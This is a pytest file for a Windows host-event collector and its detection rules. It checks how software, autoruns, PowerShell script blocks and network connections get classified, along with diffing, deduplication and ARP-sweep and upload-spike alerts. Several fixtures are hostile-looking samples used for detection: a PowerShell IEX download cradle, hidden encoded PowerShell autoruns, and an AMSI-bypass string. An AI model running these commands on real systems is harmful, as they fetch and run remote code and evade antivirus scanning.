"""Host event collection: classifiers, diffing, attribution, and the rules.

The PowerShell boundary is mocked (`_ps`), so these run on any
platform and exercise every decision the collector makes on top of what
PowerShell returned: first-run silence, install/remove diffs, hash-change
events, the agent marker, the Security-log honesty fact, and dedup.
"""

from __future__ import annotations

import json
import tempfile
import time
from pathlib import Path

import pytest

from pnma.collectors import host_events as he
from pnma.db import Database
from pnma.detections.base import DetectionContext
from pnma.detections import host_event_rules as rules


# ----------------------------------------------------------------- classifiers

@pytest.mark.parametrize("entry,expect_tags,expect_sev", [
    ({"name": "AnyDesk", "publisher": "philandro Software GmbH", "location": "C:\\Program Files (x86)\\AnyDesk"},
     {"remote_access"}, "high"),
    ({"name": "KMSpico", "publisher": "", "location": "C:\\Users\\x\\AppData\\Local\\KMSpico"},
     {"activation_tooling", "no_publisher", "user_writable_path"}, "high"),
    ({"name": "Tor Browser", "publisher": "The Tor Project"}, {"tor"}, "medium"),
    ({"name": "Nmap 7.99", "publisher": "Nmap Project"}, {"security_tooling"}, "medium"),
    ({"name": "Ngrok", "publisher": "ngrok, Inc.", "location": "C:\\Users\\x\\AppData\\Local\\Microsoft\\WinGet\\Packages\\ngrok"},
     {"tunnel", "user_writable_path"}, "medium"),
    # a known vendor shipping under AppData is how Electron apps install: inventory, not a finding
    ({"name": "PowerToys (Preview)", "publisher": "Microsoft Corporation", "location": "C:\\Users\\x\\AppData\\Local\\PowerToys\\"},
     {"user_writable_path", "trusted_publisher"}, None),
    # Burn bootstrapper cache is not a user-writable install
    ({"name": "Microsoft Visual C++ 2015-2022 Redistributable", "publisher": "Microsoft Corporation",
      "location": "C:\\ProgramData\\Package Cache\\{guid}"}, {"trusted_publisher"}, None),
    ({"name": "GNET", "publisher": ""}, {"no_publisher"}, None),
    ({"name": "GNET", "publisher": "", "installed_at": time.time() - 3600}, {"no_publisher", "recent"}, "low"),
])
def test_classify_software(entry, expect_tags, expect_sev):
    tags = he.classify_software(entry)
    assert set(tags) == expect_tags
    assert he.software_severity(tags) == expect_sev


@pytest.mark.parametrize("entry,expect_tags,expect_sev", [
    ({"name": "OneDrive", "command": '"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe" /background', "signed": True}, set(), None),
    ({"name": "PNMA.lnk", "command": '"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -NoProfile -WindowStyle Hidden -File C:\\x\\start-pnma.ps1'},
     {"pnma_own"}, None),
    ({"name": "Updater", "command": "powershell.exe -w hidden -enc SQBFAFgA"}, {"script_host", "obfuscated_or_downloader"}, "high"),
    ({"name": "x", "command": 'wscript.exe "C:\\Users\\x\\AppData\\Roaming\\a.vbs"'}, {"script_host", "user_writable_path"}, "high"),
    ({"name": "x", "command": '"C:\\Users\\x\\AppData\\Local\\Temp\\svc.exe"', "signed": False}, {"user_writable_path", "unsigned"}, "low"),
])
def test_classify_autorun(entry, expect_tags, expect_sev):
    tags = he.classify_autorun(entry)
    assert set(tags) == expect_tags
    assert he.autorun_severity(tags) == expect_sev


def test_classify_script_block_ignores_windows_boilerplate_and_scores_combos():
    assert he.classify_script_block("$__cmdletization_objectModelWrapper = 1; IEX x") == []
    single = he.classify_script_block("Invoke-Expression (Get-Content x)")
    assert [t for t, _, _ in single] == ["invoke_expression"]
    assert he.script_block_severity(single) == "medium"
    combo = he.classify_script_block("powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\"")
    tags = {t for t, _, _ in combo}
    assert {"download_cradle", "invoke_expression", "hidden_window"} <= tags
    assert he.script_block_severity(combo) == "critical"   # high + a second behaviour
    assert he.script_block_severity(he.classify_script_block("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')")) == "critical"
    assert he.script_block_severity([]) is None


@pytest.mark.parametrize("conn,expect_tags,expect_sev", [
    ({"process": "chrome.exe", "raddr": "142.250.1.1", "rport": 443}, set(), None),
    ({"process": "chrome.exe", "raddr": "192.168.0.5", "rport": 8443}, set(), None),        # LAN: ignored
    ({"process": "chrome.exe", "raddr": "100.99.171.58", "rport": 8787}, set(), None),      # tailnet: ignored
    ({"process": "claude.exe", "path": "C:\\Users\\x\\AppData\\Local\\AnthropicClaude\\claude.exe", "raddr": "34.1.1.1", "rport": 443},
     {"user_writable_binary"}, None),                                                       # Electron on 443: a tag, not a finding
    ({"process": "powershell.exe", "raddr": "45.13.7.22", "rport": 8443}, {"script_host_network"}, "high"),   # 8443 is common; the process is the finding
    ({"process": "tor.exe", "raddr": "5.5.5.5", "rport": 9001}, {"tor_shaped"}, "medium"),
    ({"process": "firefox.exe", "path": "C:\\Users\\x\\Desktop\\Tor Browser\\Browser\\firefox.exe", "raddr": "5.5.5.5", "rport": 443},
     {"tor_shaped", "user_writable_binary"}, "medium"),
    ({"process": "game.exe", "path": "C:\\Program Files\\Game\\game.exe", "raddr": "5.5.5.5", "rport": 27015}, {"uncommon_port"}, "low"),
    ({"process": "rat.exe", "path": "C:\\Users\\x\\AppData\\Roaming\\rat.exe", "raddr": "5.5.5.5", "rport": 4444},
     {"uncommon_port", "user_writable_binary"}, "medium"),
])
def test_classify_connection(conn, expect_tags, expect_sev):
    tags = he.classify_connection(conn)
    assert set(tags) == expect_tags
    assert he.connection_severity(tags) == expect_sev


# ------------------------------------------------------------------ collector

def _db():
    return Database(Path(tempfile.mkdtemp()) / "t.db")


class FakePS:
    """Scripted PowerShell: answers by which reader is asking."""

    def __init__(self):
        self.software = []
        self.autoruns = []
        self.logs = {}          # log name -> {"ok": True, "events": [...], "max": n}
        self.security_ok = False
        self.hidden = []
        self.conns = []
        self.counters = []

    def __call__(self, script, timeout=60):
        assert script.startswith(he.AGENT_MARKER), "every PNMA script must carry the marker"
        if "Uninstall" in script:
            return True, self.software, ""
        if "CurrentVersion\\Run" in script or "GetFolderPath('Startup')" in script:
            return True, self.autoruns, ""
        if "Get-WinEvent -LogName Security -MaxEvents 1" in script:
            return True, {"ok": self.security_ok, "error": None if self.security_ok else "Attempted to perform an unauthorized operation."}, ""
        if "Get-WinEvent" in script:
            for name, res in self.logs.items():
                if f"$log = '{name}'" in script:
                    return True, res, ""
            return True, {"ok": True, "events": [], "max": None}, ""
        if "Hidden" in script:
            return (True, self.hidden, "") if self.hidden else (False, None, "no output (exit 0)")
        if "Get-NetTCPConnection" in script:
            return True, self.conns, ""
        if "Get-NetAdapterStatistics" in script:
            return True, self.counters, ""
        raise AssertionError("unexpected script: " + script[:80])


@pytest.fixture()
def fake(monkeypatch):
    f = FakePS()
    monkeypatch.setattr(he, "_ps", f)
    return f


def _sw(key, name, publisher="Vendor", location="C:\\Program Files\\X", installed=""):
    return {"key": key, "name": name, "version": "1.0", "publisher": publisher,
            "installed": installed, "location": location, "uninstall": "", "hive": "HKLM"}


def test_first_run_is_inventory_only_then_diffs(fake):
    db = _db(); c = he.HostEventCollector(db)
    fake.software = [_sw("a", "Alpha"), _sw("b", "AnyDesk", "philandro Software GmbH")]
    s = c.run_once()
    assert db.query_one("SELECT COUNT(*) n FROM host_software")["n"] == 2
    assert not db.query("SELECT 1 FROM host_events WHERE kind = 'software_installed'")   # first run: no events
    fact = db.query_one("SELECT state, value FROM host_facts WHERE fact_key = 'software.flagged'")
    assert fact["state"] == "finding" and "AnyDesk" in fact["value"]                       # but the standing fact is honest

    # second run: one added, one removed
    fake.software = [_sw("b", "AnyDesk", "philandro Software GmbH"), _sw("c", "Ngrok", "ngrok, Inc.")]
    c.run_once()
    kinds = [r["kind"] for r in db.query("SELECT kind FROM host_events ORDER BY id")]
    assert kinds == ["software_installed", "software_removed"]
    ev = db.query_one("SELECT severity, detail FROM host_events WHERE kind = 'software_installed'")
    assert ev["severity"] == "medium" and "tunnel" in json.loads(ev["detail"])["tags"]
    assert db.query_one("SELECT removed_at FROM host_software WHERE software_id = 'HKLM:a'")["removed_at"]
    # third run, same state: nothing new (dedup)
    c.run_once()
    assert db.query_one("SELECT COUNT(*) n FROM host_events")["n"] == 2
    # medium classes (security tooling, tunnel, Tor) are inventory, not posture debt
    fake.software = [_sw("n", "Nmap 7.99", "Nmap Project")]
    c.run_once()
    fact = db.query_one("SELECT state, value FROM host_facts WHERE fact_key = 'software.flagged'")
    assert fact["state"] == "ok" and "Nmap" in fact["value"]


def test_autorun_hash_change_is_an_event_and_pnma_is_attributed(fake):
    db = _db(); c = he.HostEventCollector(db)
    base = {"where": "HKCU:\\...\\Run", "name": "App", "command": '"C:\\Program Files\\App\\app.exe"', "signed": True, "exe": "C:\\Program Files\\App\\app.exe", "sha256": "aaa"}
    own = {"where": "Startup", "name": "PNMA.lnk", "command": '"C:\\W\\powershell.exe" -File start-pnma.ps1', "signed": True, "exe": None, "sha256": None}
    fake.autoruns = [base, own]
    c.run_once()
    assert db.query_one("SELECT state FROM host_facts WHERE fact_key = 'autoruns.flagged'")["state"] == "ok"
    fake.autoruns = [dict(base, sha256="bbb"), own]
    c.run_once()
    ev = db.query_one("SELECT summary, severity, detail FROM host_events WHERE kind = 'autorun_added'")
    assert "changed on disk" in ev["summary"] and ev["severity"] == "medium"
    assert json.loads(ev["detail"])["previous_sha256"] == "aaa"
    fake.autoruns = [dict(base, sha256="bbb"), own, {"where": "HKCU:\\...\\Run", "name": "Upd", "command": "powershell -w hidden -enc AAAA", "signed": None}]
    c.run_once()
    rows = db.query("SELECT summary, severity FROM host_events WHERE kind = 'autorun_added' ORDER BY id")
    assert rows[-1]["severity"] == "high" and "Upd" in rows[-1]["summary"]
    assert db.query_one("SELECT state FROM host_facts WHERE fact_key = 'autoruns.flagged'")["state"] == "finding"


def test_winevents_attribute_agent_blocks_and_advance_cursor(fake):
    db = _db(); c = he.HostEventCollector(db)
    fake.logs["Microsoft-Windows-PowerShell/Operational"] = {"ok": True, "max": 12, "events": [
        {"record": 10, "id": 4104, "t": 1000, "level": "Warning", "props": ["1", "1", he.AGENT_MARKER + " Get-ItemProperty HKLM:..."]},
        {"record": 11, "id": 4104, "t": 1001, "level": "Warning", "props": ["1", "1", "$__cmdletization_objectModelWrapper"]},
        {"record": 12, "id": 4104, "t": 1002, "level": "Warning", "props": ["1", "1", "IEX (New-Object Net.WebClient).DownloadString('http://x')"]},
    ]}
    fake.logs["System"] = {"ok": True, "max": 7, "events": [
        {"record": 6, "id": 7045, "t": 1003, "props": ["EvilSvc", "C:\\Users\\Public\\x.exe", "user mode service", "auto start"]},
        {"record": 7, "id": 104, "t": 1004, "props": ["Security"], "msg": "The Security log file was cleared."},
    ]}
    c.run_once()
    rows = {r["dedup_key"]: dict(r) for r in db.query("SELECT * FROM host_events")}
    assert rows["ps4104:10"]["agent_generated"] == 1 and rows["ps4104:10"]["severity"] is None
    assert "ps4104:11" not in rows                                    # boilerplate dropped
    assert rows["ps4104:12"]["severity"] == "critical"                # cradle + IEX
    assert rows["svc7045:6"]["severity"] == "high"                    # user-writable path
    assert rows["log104:7"]["severity"] == "high"
    assert db.query_one("SELECT value FROM meta WHERE key = 'host_events_cursor_ps'")["value"] == "12"
    assert db.query_one("SELECT value FROM meta WHERE key = 'host_events_cursor_system'")["value"] == "7"
    sec = db.query_one("SELECT state, value FROM host_facts WHERE fact_key = 'events.security_log'")
    assert sec["state"] == "unknown" and "elevation" in sec["value"]  # never 'ok' when we could not read it
    assert db.query_one("SELECT state FROM host_facts WHERE fact_key = 'events.powershell_log'")["state"] == "ok"


def test_connections_record_only_notable_and_dedup_per_hour(fake):
    db = _db(); c = he.HostEventCollector(db)
    fake.conns = [
        {"raddr": "142.250.1.1", "rport": 443, "lport": 1, "pid": 1, "process": "chrome.exe", "path": "C:\\Program Files\\Google\\chrome.exe"},
        {"raddr": "45.13.7.22", "rport": 8443, "lport": 2, "pid": 2, "process": "powershell.exe", "path": "C:\\Windows\\..."},
        {"raddr": "192.168.0.9", "rport": 4444, "lport": 3, "pid": 3, "process": "rat.exe", "path": "C:\\Users\\x\\AppData\\rat.exe"},
    ]
    c.run_once(); c.run_once()
    rows = db.query("SELECT summary, severity FROM host_events WHERE kind = 'connection'")
    assert len(rows) == 1 and rows[0]["severity"] == "high" and "powershell.exe" in rows[0]["summary"]


def test_run_once_isolates_a_failing_reader(fake, monkeypatch):
    db = _db(); c = he.HostEventCollector(db)
    monkeypatch.setattr(c, "collect_software", lambda: 1 / 0)
    s = c.run_once()
    assert any("software: ZeroDivisionError" in u for u in s.unknown)
    run = db.query_one("SELECT result, error FROM scan_runs WHERE kind = 'host_events'")
    assert run and "ZeroDivisionError" in run["error"]


# ----------------------------------------------------------------------- rules

def test_rules_read_only_unattributed_rows_and_carry_requires():
    db = _db()
    now = time.time()
    db.record_host_event(kind="powershell_block", ts=now - 60, summary="agent", detail={"tags": []}, severity=None,
                         dedup_key="a", agent_generated=True)
    db.record_host_event(kind="powershell_block", ts=now - 50, summary="bad", detail={"tags": ["download_cradle"], "excerpt": "IEX"},
                         severity="high", dedup_key="b", mitre_id="T1105")
    db.record_host_event(kind="powershell_block", ts=now - 40 * 3600, summary="old", detail={"tags": ["recon"]},
                         severity="low", dedup_key="c")
    ctx = DetectionContext(db=db, now=now)
    f = rules.SuspiciousPowerShellDetection().evaluate(ctx)
    assert len(f) == 1 and f[0].severity == "high" and f[0].mitre_id == "T1105"
    assert "FOR LEARNING" in f[0].description and "4104" in f[0].description
    assert all(r.requires for r in rules.host_event_rules())


def test_arp_sweep_needs_many_targets_in_a_short_window_and_skips_agent_rows():
    db = _db(); now = time.time()
    scanner = "aa:bb:cc:00:00:99"
    db.execute("INSERT INTO devices(device_id, mac, mac_type, label, first_seen, last_seen) VALUES('s', ?, 'global', 'Plug', ?, ?)", (scanner, now, now))
    def obs(i, ts, agent=0, dst=scanner):
        db.execute("INSERT INTO observations(ts, source, agent_generated, mac, ip, detail) VALUES(?, 'passive_arp', ?, ?, ?, ?)",
                   (ts, agent, f"00:11:22:33:44:{i:02x}", f"10.0.0.{i}", json.dumps({"hwdst": dst})))
    for i in range(1, 6):
        obs(i, now - 100 + i)                      # 5 targets: below threshold
    ctx = DetectionContext(db=db, now=now)
    assert rules.ArpSweepDetection().evaluate(ctx) == []
    for i in range(6, 12):
        obs(i, now - 100 + i, agent=1)             # our own sweep: must not count
    assert rules.ArpSweepDetection().evaluate(ctx) == []
    for i in range(6, 12):
        obs(i, now - 100 + i)
    f = rules.ArpSweepDetection().evaluate(ctx)
    assert len(f) == 1 and f[0].device_id == "s" and f[0].evidence["count"] == 11 and f[0].triggers_triage_scan
    assert "Plug" in f[0].title
    # spread over an hour: not a sweep
    db2 = _db()
    for i in range(1, 20):
        db2.execute("INSERT INTO observations(ts, source, agent_generated, mac, ip, detail) VALUES(?, 'passive_arp', 0, ?, ?, ?)",
                    (now - 3600 + i * 180, f"00:11:22:33:44:{i:02x}", f"10.0.0.{i}", json.dumps({"hwdst": scanner})))
    assert rules.ArpSweepDetection().evaluate(DetectionContext(db=db2, now=now)) == []


def test_upload_spike_needs_baseline_and_ratio():
    db = _db(); now = time.time()
    sent = 0.0
    for i in range(0, 6 * 3600 + 601, 300):
        ts = now - 6 * 3600 - 600 + i
        sent += (20_000.0 if ts < now - 600 else 1_200_000.0) * 300
        db.execute("INSERT INTO host_counters(ts, adapter, bytes_sent, bytes_recv) VALUES(?,?,?,?)", (ts, "Wi-Fi", sent, 0))
    f = rules.UploadSpikeDetection().evaluate(DetectionContext(db=db, now=now))
    assert len(f) == 1 and "Wi-Fi" in f[0].title and f[0].evidence["recent_rate_bps"] > 1e6
    # too little history: silent, not a guess
    db2 = _db()
    for i in range(3):
        db2.execute("INSERT INTO host_counters(ts, adapter, bytes_sent, bytes_recv) VALUES(?,?,?,?)", (now - 600 + i * 300, "Wi-Fi", i * 1e9, 0))
    assert rules.UploadSpikeDetection().evaluate(DetectionContext(db=db2, now=now)) == []


# ---------------------------------------------------------- live smoke (Windows)

@pytest.mark.skipif(not he.is_windows(), reason="runs the real PowerShell readers")
def test_live_readers_run_clean_on_this_host():
    """The mocked tests cannot catch a PowerShell syntax error. This runs every
    reader once for real against a scratch DB and requires that the only
    thing it could not read is the Security log (elevation), never a script
    that failed to parse. Slow (~10s), Windows-only, and worth it: three of
    the first four bugs in this collector were PowerShell syntax."""
    db = _db(); c = he.HostEventCollector(db)
    s = c.run_once()
    unexpected = [u for u in s.unknown if "Security:" not in u and "cap hit" not in u]
    assert unexpected == [], unexpected
    assert db.query_one("SELECT COUNT(*) n FROM host_software")["n"] > 0
    assert db.query_one("SELECT COUNT(*) n FROM host_counters")["n"] > 0
    assert db.query_one("SELECT state FROM host_facts WHERE fact_key = 'events.powershell_log'")["state"] == "ok"
